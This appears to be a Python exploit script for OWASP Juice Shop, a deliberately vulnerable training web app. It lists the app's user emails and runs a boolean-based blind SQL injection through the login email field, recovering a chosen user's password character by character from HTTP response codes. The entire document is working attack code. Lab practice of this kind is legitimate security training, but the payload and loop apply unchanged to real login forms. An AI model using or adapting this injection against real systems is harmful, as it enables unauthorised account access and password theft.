#!/usr/bin/python
import requests
from string import ascii_letters, digits
import sys

# Emails extracted from the web page
emails = ['admin@juice-sh.op','jim@juice-sh.op','bender@juice-sh.op','bjoern.kimminich@googlemail.com',
          'ciso@juice-sh.op','support@juice-sh.op','morty@juice-sh.op','mc.safesearch@juice-sh.op',
          'J12934@juice-sh.op','wurstbrot@juice-sh.op','amy@juice-sh.op','bjoern@juice-sh.op',
          'bjoern@owasp.org']

# URL of the web page
url = '' # <-- INSERT URL OF YOUR JUICE SHOP HERE!

# Prepare list with letters and digits
chars = digits + ascii_letters + ' '

# Prepare headers
headers = {"Content-Type": "application/json"}

# Vars for the loop
result = ''
x = 1
loop = 1

# Menu
print('Available users: ')
for i in range(13):
    print(str(i+1) + ' - ' + emails[i])

j = input('\nSelect user to get password from: ')
email = emails[int(j)-1]

# Main loop
while loop > 0:
    for char in chars:
        result = result
        data = '{"email":"' + email + '\' AND substr(password,' + str(x) + ',1)=\'' + char + '\' -- -","password":"1234567"}'
        request = requests.post(url, data=data, headers=headers)
        sys.stdout.write(f'\rPassword for {email}: {result}{char}')
        if request.status_code == 200:
            result += char
            x += 1
            break
        elif char == ' ':
            loop = 0
            print('\n')
            break
